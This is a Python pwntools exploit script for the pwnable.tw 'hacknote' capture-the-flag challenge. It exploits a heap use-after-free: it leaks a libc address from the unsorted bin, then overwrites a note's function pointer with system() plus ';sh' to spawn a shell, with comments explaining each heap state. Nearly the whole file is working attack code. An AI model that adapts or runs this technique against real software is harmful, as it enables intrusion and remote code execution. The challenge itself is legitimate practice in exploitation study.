#!/usr/bin/env python3

from pwn import *

elf = ELF("./hacknote_patched")
libc = ELF("./libc_32.so.6")

context.binary = elf
context.terminal = "kitty @ launch --location=vsplit --cwd=current".split()
#context.log_level = 'debug'

def conn():
    if args.REMOTE:
        p = remote("chall.pwnable.tw", 10102)
    else:
        if args.GDB:
            p = gdb.debug([elf.path], aslr=True, api=False, gdb_args=["-x", "./.gdbinit"], gdbscript="""
                """)
        else:
            p = process([elf.path])

    return p

def recv_menu(p):
    p.recvuntil("Your choice :")

def add_note(p, size, content: bytes):
    recv_menu(p)
    p.send(b"1")
    p.sendafter(b"Note size :", str(size).encode())
    p.sendafter(b"Content :", content)

def delete_note(p, idx):
    recv_menu(p)
    p.send(b"2")
    p.sendafter(b"Index :", str(idx).encode())
    return p.recvline()

def print_note(p, idx):
    recv_menu(p)
    p.send(b"3")
    p.sendafter(b"Index :", str(idx).encode())
    return p.recvline(timeout=3)

def main():
    p = conn()

    # pwn it
    add_note(p, 0x1000, b"lixo")                    # chunk A
    add_note(p, 8, b"lixo2")                        # chunk B (to not consolidate with top chunk)
    delete_note(p, 0)                               # free chunk A

    """
       heap: [top chunk] [chunk B]

       bins:
           fastbins:
               0x10: [chunk A]
           unsorted bins:
               all:  [chunk A content]
       """

    add_note(p, 0x30, b"AAAA")                      # chunk C (address of chunk A, first 0x30 bytes of A's content too)

    """
       heap: [top chunk] [chunk B] [chunk C]

       chunk C @ [chunk A addr]:
           +0x0:   func_ptr
           +0x4:   first 0x30 bytes of [chunk A content]
               [chunk A content]:
                   +0x0:   "AAAA"
                   +0x4:   <BK ptr> (main_arena:libc)
       """

    leak = print_note(p, 2).strip()[4:8]
    main_arena_leak = u32(leak)
    libc.address = main_arena_leak - 0x1af000 - 0x1000 - 0xac0

    log.info(f"{leak = }")
    log.info(f"{hex(main_arena_leak) = }")
    log.success(f"{hex(libc.address) = }")

    system = libc.sym.system
    log.info(f"system addr: {hex(system)}")

    add_note(p, 0x30, b"xd")                        # chunk D
    delete_note(p, 1)
    delete_note(p, 3)

    """
    heap:   [top chunk] [chunk C]

    bins:
        fastbins:
            0x10:   [chunk D] -> [chunk B] -> [chunk B content]
            0x40:   [chunk D content]

    on the next add_note, we will be able to overwrite chunk B func_ptr and make it point to system

    the program passes the address of the note itself to the func_ptr, so we need to cross our fingers and hope that theres no \x00 in <Note_addr> and <system addr> to reach ";sh" and give us shell
    """

    add_note(p, 8, p32(system) + b";sh\x00")        # chunk E with content pointing to chunk B
    print_note(p, 1)

    p.interactive()

if __name__ == '__main__':
    main()

